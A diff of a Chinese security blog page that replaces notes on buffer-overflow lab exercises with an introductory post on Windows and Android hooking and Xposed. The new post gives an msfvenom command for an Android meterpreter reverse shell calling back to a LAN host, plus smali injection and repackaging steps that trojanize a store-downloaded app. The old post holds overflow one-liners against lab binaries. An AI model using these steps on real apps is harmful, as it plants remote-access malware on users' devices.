@@ -79,7 +79,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="PWN," />
+  <meta name="keywords" content="hook," />
 
 
 
@@ -97,18 +97,20 @@
 
 
 
-<meta name="description" content="0x00  pwn基础练习 　　这个算是比较基础的教程，因为学起来不会感觉到吃力，只要懂一些基本的知识就行了。这是一个实验课程，因此里面有好多实践的东西，感觉这样更能深刻理解其中的原理。还有就是感觉这个课程里针对缓冲区溢出攻击的几个方面分的也比较清晰。">
-<meta name="keywords" content="PWN">
+<meta name="description" content="注：文中讲解的安卓Hook技术只有Java层级的Hook技术，并未涉及Native层级的Hook技术。 0x00 Hook是什么Hook，英文解释是钩子或挂钩，在windows系统和安卓系统中都有自己的一套事件分发机制，应用程序，包括应用触发事件和后台逻辑处理也是根据事件流程一步一步往下执行，而我们所说的钩子就是在事件传送到终点前截获并监控事件的传输，像钩子一样钩上事件，并且去处理一些我们需要让">
+<meta name="keywords" content="hook">
 <meta property="og:type" content="article">
-<meta property="og:title" content="合天实验室《pwn基础练习》学习总结">
-<meta property="og:url" content="http://lc.dropsec.xyz/2017/01/20/合天实验室《pwn基础练习》学习总结/index.html">
+<meta property="og:title" content="Hook技术初探">
+<meta property="og:url" content="http://lc.dropsec.xyz/2017/11/20/Hook技术初探/index.html">
 <meta property="og:site_name" content="HEADS43">
-<meta property="og:description" content="0x00  pwn基础练习 　　这个算是比较基础的教程，因为学起来不会感觉到吃力，只要懂一些基本的知识就行了。这是一个实验课程，因此里面有好多实践的东西，感觉这样更能深刻理解其中的原理。还有就是感觉这个课程里针对缓冲区溢出攻击的几个方面分的也比较清晰。">
+<meta property="og:description" content="注：文中讲解的安卓Hook技术只有Java层级的Hook技术，并未涉及Native层级的Hook技术。 0x00 Hook是什么Hook，英文解释是钩子或挂钩，在windows系统和安卓系统中都有自己的一套事件分发机制，应用程序，包括应用触发事件和后台逻辑处理也是根据事件流程一步一步往下执行，而我们所说的钩子就是在事件传送到终点前截获并监控事件的传输，像钩子一样钩上事件，并且去处理一些我们需要让">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-08-22T05:38:41.855Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006jDttTly1flqxkkz2k8j30el08n0t3.jpg">
+<meta property="og:updated_time" content="2017-11-23T11:17:05.359Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="合天实验室《pwn基础练习》学习总结">
-<meta name="twitter:description" content="0x00  pwn基础练习 　　这个算是比较基础的教程，因为学起来不会感觉到吃力，只要懂一些基本的知识就行了。这是一个实验课程，因此里面有好多实践的东西，感觉这样更能深刻理解其中的原理。还有就是感觉这个课程里针对缓冲区溢出攻击的几个方面分的也比较清晰。">
+<meta name="twitter:title" content="Hook技术初探">
+<meta name="twitter:description" content="注：文中讲解的安卓Hook技术只有Java层级的Hook技术，并未涉及Native层级的Hook技术。 0x00 Hook是什么Hook，英文解释是钩子或挂钩，在windows系统和安卓系统中都有自己的一套事件分发机制，应用程序，包括应用触发事件和后台逻辑处理也是根据事件流程一步一步往下执行，而我们所说的钩子就是在事件传送到终点前截获并监控事件的传输，像钩子一样钩上事件，并且去处理一些我们需要让">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/006jDttTly1flqxkkz2k8j30el08n0t3.jpg">
 
 
 
@@ -138,13 +140,13 @@
 
 
 
-  <link rel="canonical" href="http://lc.dropsec.xyz/2017/01/20/合天实验室《pwn基础练习》学习总结/"/>
+  <link rel="canonical" href="http://lc.dropsec.xyz/2017/11/20/Hook技术初探/"/>
 
 
 
 
 
-  <title>合天实验室《pwn基础练习》学习总结 | HEADS43</title>
+  <title>Hook技术初探 | HEADS43</title>
   
 
 
@@ -315,7 +317,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://lc.dropsec.xyz/2017/01/20/合天实验室《pwn基础练习》学习总结/">
+    <link itemprop="mainEntityOfPage" href="http://lc.dropsec.xyz/2017/11/20/Hook技术初探/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="HEADS43">
@@ -332,7 +334,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">合天实验室《pwn基础练习》学习总结</h1>
+          <h1 class="post-title" itemprop="name headline">Hook技术初探</h1>
         
 
         <div class="post-meta">
@@ -344,8 +346,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-01-20T15:16:24+08:00">
-                2017-01-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-20T19:25:00+08:00">
+                2017-11-20
               </time>
             
 
@@ -362,7 +364,7 @@
 
           
           
-             <span id="/2017/01/20/合天实验室《pwn基础练习》学习总结/" class="leancloud_visitors" data-flag-title="合天实验室《pwn基础练习》学习总结">
+             <span id="/2017/11/20/Hook技术初探/" class="leancloud_visitors" data-flag-title="Hook技术初探">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -393,83 +395,30 @@
       
 
       
-        <p><strong>0x00  pwn基础练习</strong></p>
-<p>　　这个算是比较基础的教程，因为学起来不会感觉到吃力，只要懂一些基本的知识就行了。这是一个实验课程，因此里面有好多实践的东西，感觉这样更能深刻理解其中的原理。还有就是感觉这个课程里针对缓冲区溢出攻击的几个方面分的也比较清晰。</p>
+        <hr>
+<p><strong>注：文中讲解的安卓Hook技术只有Java层级的Hook技术，并未涉及Native层级的Hook技术。</strong></p>
+<h1 id="0x00-Hook是什么"><a href="#0x00-Hook是什么" class="headerlink" title="0x00 Hook是什么"></a>0x00 Hook是什么</h1><p>Hook，英文解释是钩子或挂钩，在windows系统和安卓系统中都有自己的一套事件分发机制，应用程序，包括应用触发事件和后台逻辑处理也是根据事件流程一步一步往下执行，而我们所说的钩子就是在事件传送到终点前截获并监控事件的传输，像钩子一样钩上事件，并且去处理一些我们需要让它去处理的事情，也就是有时候会说的劫持，也可以称为动态注入。</p>
 <a id="more"></a>
-<p><strong>0x01  缓冲区溢出攻击的基本操作</strong></p>
-<p>　　这个部分主要就是就是一些基础中的基础，比如说是汇编的基础和python的基础了解，然后就是对于gdb这个工具的使用吧。</p>
-<p>　　下面就来看看具体的分析流程：</p>
-<p>　　首先是cat到源码进行分析（源码如下），可以看到gets()函数有可能会引发缓冲区溢出，因为gets()函数读取数据时不会对内容缓冲区的长度进行检查，而如果输入超出缓冲区长度就会发生溢出。</p>
-<p>　　源码如下：</p>
-<pre>
-
-#include <stdio.h>
-int main(int argc, char** argv)
-{
-    int modified;
-    char buffer[64];
-    modified = 0;
-    gets(buffer);        // 引发缓冲区溢出
-    if (modified != 0)
-    {
-        printf("Congratulations, you pwned it.\n");
-    }
-    else
-    {
-        printf("Please try again.\n");
-    }
-    return 0;
-}
-
-</stdio.h></pre>
-
-<p>　　然后是用gdb反汇编得到汇编代码进行分析，下面是对main函数中的汇编代码的解释：</p>
-<pre>
-0x080482a0 <+0>:   push   %ebp
-0x080482a1 <+1>:   mov    %esp,%ebp
-0x080482a3 <+3>:   and    $0xfffffff0,%esp
- esp = esp - 0x60，即在栈上分配0x60）字节的空间
-0x080482a6 <+6>:   sub    $0x60,%esp
- modified变量位于esp + 0x5C处，将其初始化为0
-0x080482a9 <+9>:   movl   $0x0,0x5c(%esp)
- buffer位于esp + 0x1C处
-0x080482b1 <+17>:  lea    0x1c(%esp),%eax
-0x080482b5 <+21>:  mov    %eax,(%esp)
- 调用gets(buffer)读取输入数据
-0x080482b8 <+24>:  call   0x8049360 <gets>
- 判断modified变量的值是否是0
-0x080482bd <+29>:  cmpl   $0x0,0x5c(%esp)
- 如果modified的值等于0，就跳转到 0x080482d2
-0x080482c2 <+34>:  je     0x80482d2 <main+50>
- modified不为0，打印成功提示
-0x080482c4 <+36>:  movl   $0x80b3eec,(%esp)
-0x080482cb <+43>:  call   0x8049500 <puts>
-0x080482d0 <+48>:  jmp    0x80482de <main+62>
- modified为0，打印失败提示
-0x080482d2 <+50>:  movl   $0x80b3f0b,(%esp)
-0x080482d9 <+57>:  call   0x8049500 <puts>
-0x080482de <+62>:  mov    $0x0,%eax
-0x080482e3 <+67>:  leave
-0x080482e4 <+68>:  ret
-
-
-</+68></+67></+62></puts></+57></+50></main+62></+48></puts></+43></+36></main+50></+34></+29></gets></+24></+21></+17></+9></+6></+3></+1></+0></pre>
-
-<p>　　看到上面的源码和汇编代码，程序的大概流程应该就清楚了，从中我们得知buffer在esp+0x1C处，而modified在esp+0x5C处，这两个地址之间隔着刚好六十四，也就是buffer数组的大小。因此，modified也就是从第六十五位输入的的数据开始，而在这个程序中只要是使得modified的值不为0就行，那也就是说只要第六十五个输入的对应ASCII值不为零就好了，事实也就是这样的。我们还可以直接使用python命令pwn掉程序：python -c “print ‘A’*64+’B’” | ./pwn1，这样更能体验到pwn的乐趣，但这也是前面大量工作的铺垫。</p>
-<p>　　最后挖一个坑，实验里面的成功提示信息的地址是从何得来的，有时间再仔细的过一遍吧。</p>
-<p><strong>0x02  精确覆盖变量数据</strong></p>
-<p>　　这个感觉跟第一课时的差别不是很大，这个课时的示例程序是一个带有两个参数的main函数，两个参数方分别是参数的个数argc另一个argv则是指向一个具体存储参数内容的字符串数组。感觉这个程序和上一个的区别在于，上一个是一个，随便溢出都行，这个则是需要计算出需要溢出的长度和内容。而这里呢就涉及到一个大端小段存储的知识点，这是两种不同的存储方式，我们只需记得小端存储就是高位数据存在高地址，低位数据存在低地址。</p>
-<p>　　经过和第一课时相同的分析过程，得出这个程序正常运行是不会跳转到成功信息的，需要的是对溢出的信息控制为0x61626364。也和上一课时一样，buffer位于esp+0x1C处，而modified位于esp+0x5C处，他们相差64，所以得溢出四位数据来，先用1234来测试发现其是使用的小端存储，于是控制溢出信息为\x64\x63\x62\x61，这样的话使用python就能一步解决了：python -c “print ‘A’*64+’dcba’” | xargs ./pwn2（xargs是Linux中的一个命令，它可以将输入数据当做命令行参数传给指定的程序）</p>
-<p><strong>0x03  环境变量继承</strong></p>
-<p>　　第三课时的环境变量的继承就有点难度了，虽说跟前面的差不多的分析过程但是首先得懂得环境变量继承的原理。</p>
-<p>　　所谓程序运行的环境也就是一个外部条件，或者说他运行时的外部的样子，同时，跟子承父业一样当一个父进程启动一个子进程时，这个子进程会继承父进程的环境变量。在上一课时的main函数里还可以有个参数，它是指向另一个数组的，这个数组存储的是具体的环境变量参数，而在这个示例程序中是使用了buffer通过strcpy()函数模拟子进程继承父进程的环境变量值variable，而modified则是需要控制的溢出值，同上的分析过程，结果也同上，需要控制的溢出内容是添加一个六十八位的数据（后四位按要求来）来作为新的环境变量。</p>
-<p>　　而这个步骤却可以有两种不同的方式来解决，一种是按部就班的使用Linux语句命令来进行运行。另一种则是使用python脚本来实现，也就是事先编辑好了一串命令，来运行直接达到你的目的。具体的脚本参见附件。</p>
-<p><strong>0x04  函数指针改写</strong></p>
-<p>　　这个函数指针的改写，我觉得跟前面的一样，就是改变了一下形式，这里是要溢出覆盖的是一串地址，也就是相当于是修改一个函数的入口地址，是这个程序按照你的意思来运行，借以达到目的。</p>
-<p> 　　这里面涉及到了objdump这个工具的使用，之前也稍微接触过，如果说gdb是Linux的OD，那它就是Linux的ida（差不多，但感觉不如ida强大），也就是倚天屠龙的关系。这个工具可以静态调试程序，查看每个功能函数的汇编。</p>
-<p>　　这个示例程序是先设一个函数指针，然后使用gets()函数来获取他，这样只用上面的分析然后进行溢出控制，是的函数指针的值变为win()函数的入口地址就好了，而函数的入口地址使用objdump查看就好了。这样也是很容易就pwn掉了它。</p>
-<p><strong>0x05  溢出攻击的总结</strong></p>
-<p>　　通过这几个课时的学习，也差不多了解了其中的原理。首先我们得找出溢出点，还得知道溢出长度，这样才能去编写shellcode来攻击它，得到我们想要的结果。</p>
+<h1 id="0x01-Windows下的Hook技术"><a href="#0x01-Windows下的Hook技术" class="headerlink" title="0x01  Windows下的Hook技术"></a>0x01  Windows下的Hook技术</h1><p>在Windows平台下Hook技术类似与中断机制，Hook机制允许应用程序拦截并处理Windows消息或者事件。Hook的适用范围也可分为线程钩子和系统钩子，其中系统钩子功能更加强大，能控制几乎所有Windows消息。Hook技术涉及到的两个重要的API是SetWindowsHookEx（安装钩子）和UnHookWindowsHookEx（卸载钩子）。</p>
+<p>我们熟知的防火墙和防毒软件都运用到APIHook技术，</p>
+<h1 id="0x02-安卓Hook技术"><a href="#0x02-安卓Hook技术" class="headerlink" title="0x02  安卓Hook技术"></a>0x02  安卓Hook技术</h1><p>安卓上的Hook技术又称为安卓APIHook技术，这个技术也由来已久，是一种在操作系统未能提供所需要功能能情况下的特殊手段。Android系统的开发有两种模式：Linux搭的Native模式和虚拟机上的Java模式，所以对应的Hook技术也就分为Java层级的Hook和Native层级的Hook。但是由于在Java中可以使用native关键字对C/C++代码进行调用，但是在C/C++中却很难调用Java中的代码，所以一般情况下能够在Java层级完成的不会在Native层级去完成。</p>
+<p>Hook技术说白了就是劫持函数的调用，但是由于处于Linux用户态，每个进程都有自己独立的进程空间，那么就必须先注入到所要Hook的进程空间，修改其内存中的进程代码，替换其过程表的符号地址。相应的在Android系统中一般是通过ptrace函数来附加进程，再向远程进程注入so库，从而能够监控并对远程进程进行挂钩。</p>
+<h1 id="0x03-手动注入技术的实现"><a href="#0x03-手动注入技术的实现" class="headerlink" title="0x03  手动注入技术的实现"></a>0x03  手动注入技术的实现</h1><p>手动注入的实现还是很简单的，只是简单的将apk反编译后插入我们需要注入的代码即可，下面就拿上次在团队宣讲会上用到的一个简单的小例子，将一个从小米应用商店下载的apk利用msf生成的木马手动撸下来权限。</p>
+<p><strong>利用msf生成木马apk</strong></p>
+<p>使用下面的命令就能通过msf生成一个现成的木马apk：</p>
+<pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.169 LPORT=4444 R &gt; pentestlab.apk
+</code></pre><p><strong>反编译木马apk和目标apk，并修改smali代码</strong></p>
+<p>使用命令行或者集成工具都可以，反编译找出目标apk的程序起始点。先将目标apk反编译，在mianactivity里面通过OnCreate函数占到程序开始运行时对应的代码，然后在这里添加进一段代码，使得程序在启动时先启动木马apk，这样就可以get到需要的shell，添加的代码如下：</p>
+<pre><code>invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V
+</code></pre><p><strong>二次打包并签名</strong></p>
+<p>先将之前反编译出来的木马apk中的smali代码复制到目标程序的对应位置，再使用apktool进行二次打包并签名这样就完成一个手动注入恶意代码的过程。</p>
+<p><img src="http://ww1.sinaimg.cn/large/006jDttTly1flqxkkz2k8j30el08n0t3.jpg" alt=""></p>
+<p>由上面的图中可以看的更加清楚一些，在手动注入的操作中，或者说对于一些简单的安卓逆向，首先要将这个流程理清楚，才能再去了解一些细节性的东西。</p>
+<h1 id="0x04-安卓动态注入技术的原理"><a href="#0x04-安卓动态注入技术的原理" class="headerlink" title="0x04  安卓动态注入技术的原理"></a>0x04  安卓动态注入技术的原理</h1><p>从上面也可以看出，smail代码的篡改需要先反编译apk在重新打包，重打包后还需要重新签名，而我们使用的Java层级的Hook技术则可以解决这个问题，因为利用Hook技术我们可以把自定义代码注入到应用的进程空间，达到不修改代码却能修改控制代码的执行。</p>
+<p>动态注入我们所需要关注的几个主要的函数有ptract函数，dlopen函数，mmap函数。ptract函数是Android内核中的一个系统函数，它可以完成动态跟踪一个目标进程（attach）、结束跟踪一个目标进程（detach）、获取内存字节（peektext）、向内存写入地址（poketext）等操作。内核中的另一个系统函数dlopen可以已制定模式打开制定的动态链接库文件。还有个mmap函数可以分配一段临时的内存空间来存放要注入的代码。</p>
+<p><strong>XPosed框架的介绍及原理</strong></p>
+<p>Xposed是一个开源的框架，在GitHub上都是有源码的，它的功能是在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义的一些代码，从而实现对该应用的定制，利用xposed框架也可以很容易获取应用中的信息，如加密私钥，salt值等，这样我们不需要再去反编译分析密钥转换算法，加密机制，直接hook加密函数获取输入输出即可。</p>
+<p>在Android系统中，应用的进程都是由Zygote进程孵化而来，Zygote进程在启动时会创建一个Dalvik虚拟机实例，每当它fork一个新的应用程序进程时，都会将这个Dalvik虚拟机实例复制到新的应用程序进程中去，从而使得每一个应用都有一个独立的Dalvik虚拟机实例。Zygote进程在启动的过程中还会将Java运行库加载到进程中，并注册一些Android核心类的JNI方法到前面创建的DAlvik虚拟机实例中去。因此Xposed选择对Zygote进程进行Hook就能够实现对系统上所有的程序进程Hook，也就是全局Hook。</p>
 
       
     </div>
@@ -487,7 +436,7 @@ int main(int argc, char** argv)
       
         <div class="post-tags">
           
-            <a href="/tags/PWN/" rel="tag"># PWN</a>
+            <a href="/tags/hook/" rel="tag"># hook</a>
           
         </div>
       
@@ -500,8 +449,8 @@ int main(int argc, char** argv)
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/12/20/堆栈结构浅析/" rel="next" title="堆栈结构浅析">
-                <i class="fa fa-chevron-left"></i> 堆栈结构浅析
+              <a href="/2017/10/25/整数溢出整理/" rel="next" title="整数溢出漏洞原理及实例分析">
+                <i class="fa fa-chevron-left"></i> 整数溢出漏洞原理及实例分析
               </a>
             
           </div>
@@ -509,10 +458,6 @@ int main(int argc, char** argv)
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/02/04/Reserve系列题目浅析（一）/" rel="prev" title="Reserve系列题目浅析（一）">
-                Reserve系列题目浅析（一） <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -592,8 +537,17 @@ var jiathis_config={
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel sidebar-panel-active">
+      <section class="site-overview sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           
             <img class="site-author-image" itemprop="image"
@@ -676,6 +630,22 @@ var jiathis_config={
 
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-Hook是什么"><span class="nav-number">1.</span> <span class="nav-text">0x00 Hook是什么</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Windows下的Hook技术"><span class="nav-number">2.</span> <span class="nav-text">0x01  Windows下的Hook技术</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-安卓Hook技术"><span class="nav-number">3.</span> <span class="nav-text">0x02  安卓Hook技术</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-手动注入技术的实现"><span class="nav-number">4.</span> <span class="nav-text">0x03  手动注入技术的实现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-安卓动态注入技术的原理"><span class="nav-number">5.</span> <span class="nav-text">0x04  安卓动态注入技术的原理</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
